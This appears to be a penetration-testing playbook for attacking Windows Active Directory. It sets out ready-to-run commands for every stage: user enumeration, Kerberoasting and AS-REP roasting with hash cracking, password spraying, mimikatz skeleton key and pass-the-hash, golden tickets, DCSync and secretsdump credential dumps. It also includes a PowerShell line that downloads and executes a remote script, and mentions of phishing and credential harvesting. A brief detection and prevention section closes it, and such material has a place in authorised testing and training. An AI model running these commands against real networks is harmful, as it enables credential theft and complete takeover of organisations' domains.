# Active Directory Attack Chain

## AD Attack Methodology

This guide documents the complete Active Directory attack chain from initial recon to domain dominance.

## Attack Flow Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                     AD Attack Kill Chain                         │
└─────────────────────────────────────────────────────────────────┘

Recon ──► Enum ──► Initial Access ──► PrivEsc ──► Persistence ──► Lateral ──► Domain
  │        │           │               │            │            │         │
  ▼        ▼           ▼               ▼            ▼            ▼         ▼
gogo    kerbrute    phishing       UAC bypass   gMSA abuse    nxc      secretsdump
fscan   pywerview   kerberoast     DLL hijack   ACL abuse     wmiexec   DCSync
nmap    ldapdomain   AS-REP roast  Token priv    DCsync       psexec    GoldenTicket
```

## Phase 1: Reconnaissance

### Network Discovery
```bash
# Fast host discovery
gogo -t 100 -i 192.168.1.0/24 -q -f hosts.txt

# Comprehensive scan
fscan -h 192.168.1.0/24 -np -silent -nocolor -o fscan.txt

# Identify DCs
grep -i "domain controller" fscan.txt
grep -i "LDAP" fscan.txt
```

### DC Identification
```bash
# DNS zone transfer
dig axfr domain.local @DC_IP

# NBT scan
nmap -p 389,636,3268 --script=lsrpc-enum-domain-users DC_IP
```

## Phase 2: Enumeration

### User Enumeration
```bash
# Kerberos enumeration (no auth required)
kerbrute userenum -d domain.local --dc DC01 userlist.txt

# RID cycling
nxc smb DC_IP -u '' -p '' --rid-brute

# LDAP anonymous enum
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local"
```

### Domain Structure
```bash
# BloodHound collection (Windows)
SharpHound.exe -c Default,Group,LocalAdmin,RDP,Session,ACL,Trusts

# BloodHound collection (Linux)
bloodhound-python -c Default -d domain.local -u user -p pass

# pywerview enumeration
pywerview.py get-domain-user -d domain.local --dc-ip DC_IP -u user -p pass
pywerview.py get-domain-group -d domain.local --dc-ip DC_IP -u user -p pass
pywerview.py get-domain-computer -d domain.local --dc-ip DC_IP -u user -p pass

# ldapdomaindump
ldapdomaindump ldap://DC_IP -u 'DOMAIN\user' -p 'pass' -o ldapdump/
```

### Trust Enumeration
```bash
# Domain trusts
nxc smb DC_IP -u user -p pass --domain-trusts

# Forest enumeration
BloodHound -c Trusts
```

## Phase 3: Initial Access

### Kerberoasting
```bash
# Request TGS for all SPNs
impacket-GetUserSPNs domain.local/user:password -request

# Crack with hashcat
hashcat -m 13100 kerberoast.txt wordlist.txt

# Targeted kerberoast
impacket-GetUserSPNs domain.local/user:password -request -spn MSSQLSvc/db.domain.local
```

### AS-REP Roasting
```bash
# Find users with DONT_REQ_PREAUTH
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt wordlist.txt
```

### Password Spraying
```bash
# HTTP Basic Auth spray
hydra -L users.txt -P passwords.txt http-get://target/owa/

# LDAP spray
nxc ldap domain.local -u users.txt -p 'Spring2024!' --password-not-required
```

### Phishing
- **O365 phishing**: Phishing O365 with evilgnx
- **VPN phishing**: Clone VPN login pages
- **Credential harvesting**: Inject into legitimate sites

## Phase 4: Privilege Escalation

### Local PrivEsc
```bash
# WinPEAS (Windows)
winPEASx64.exe

# LinPEAS (Linux)
./linpeas.sh

# PrivescCheck (PowerShell)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/PrivescCheck.ps1')"
```

### AD PrivEsc
```bash
# PowerView escalation checks
Invoke-ShareFinder
Invoke-FindLocalAdminAccess
Invoke-BloodHound -CollectionMethod ACL

# Find interesting ACLs
Find-InterestingDomainACL -ResolveGUIDs

# Unconstrained delegation
nxc smb * -u '' -p '' --unconstrained
```

## Phase 5: Persistence

### Account Persistence
```bash
# Golden Ticket
impacket-ticketer -nthash krbtgt_hash -domain-sid SID -domain domain.local admin

# Silver Ticket
impacket-ticketer -nthash service_hash -domain-sid SID -domain domain.local -spn service target

# Skeleton Key
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

### ACL Abuse
```bash
# Add to privileged group
net group "Domain Admins" user /add /domain

# Write to gMSA password
Add-DomainObjectACL -TargetIdentity "CN=gMSA,CN=Managed Service Accounts" -PrincipalIdentity user -RightsWriteDacl

# DCSync permission
Add-DomainObjectACL -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity user -Rights DCSync
```

## Phase 6: Lateral Movement

### WMI
```bash
impacket-wmiexec domain/user:pass@target 'command'
```

### SMB
```bash
nxc smb target -u user -p pass --exec-method wmiexec --share C$
```

### RDP
```bash
# Enable RDP
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Jump box
xfreerdp /u:user /d:domain /p:pass /v:target
```

### Pass-the-Hash
```bash
# Overpass the hash
mimikatz # sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:powershell

# PTH with impacket
impacket-psexec -hashes :hash domain/user@target cmd.exe
```

## Phase 7: Domain Dominance

### DCSync
```bash
impacket-secretsdump domain/user:pass@DC
```

### Golden Ticket
```bash
# Create ticket
impacket-ticketer -nthash krbtgt_hash -domain-sid SID -domain domain.local golden

# Use ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain.local/admin@dc.domain.local
```

### Domain Admin Actions
```bash
# Dumps
impacket-secretsdump -just-dc-ntlm domain.local/user@dc

# Golden Ticket + DCSync
sekurlsa::pth /user:krbtgt /domain:domain /ntlm:hash /run:powershell
lsadump::dcsync /domain:domain.local /user:krbtgt
```

## Attack Path Examples

### Path 1: Kerberoast → DA
```
User Enum → Kerberoast → Crack Hash → Domain Admin
```

### Path 2: AS-REP → DA
```
Find Pre-Auth Disabled → AS-REP Roast → Crack → Domain Admin
```

### Path 3: ACL Abuse
```
User with WriteDACL → Add Self to DA Group → Domain Admin
```

### Path 4: Unconstrained Delegation
```
DC with Unconstrained → Force Auth → Capture TGT → DCSync
```

## Detection & Prevention

### Detection
```bash
# Monitor for:
- Kerberoasting (4769 with encrypted_timestamp set)
- Golden Ticket (TGT lifetime anomalies)
- Unusual LDAP queries
- Admin group modifications
```

### Prevention
- **MFA** for privileged accounts
- **Protected Users** security group
- **Credential Guard**
- **Account Tiering**
- **Audit ACL changes**
- **Monitor SPNs**

## Reporting Template

```markdown
## Attack Path: [Name]

### Initial Access
- **Technique**: [Kerberoast/Phishing/etc.]
- **Target**: [User/Computer]
- **Evidence**: [Command output]

### Privilege Escalation
- **Technique**: [ACL Abuse/etc.]
- **From**: [User]
- **To**: [Privilege]
- **Evidence**: [Command output]

### Lateral Movement
- **Technique**: [WMI/SMB/etc.]
- **Target**: [Computer]
- **Evidence**: [Command output]

### Impact
- **Achieved**: [Domain Admin/etc.]
- **Likelihood**: [High/Medium/Low]
- **Recommendations**: [Remediation steps]
```
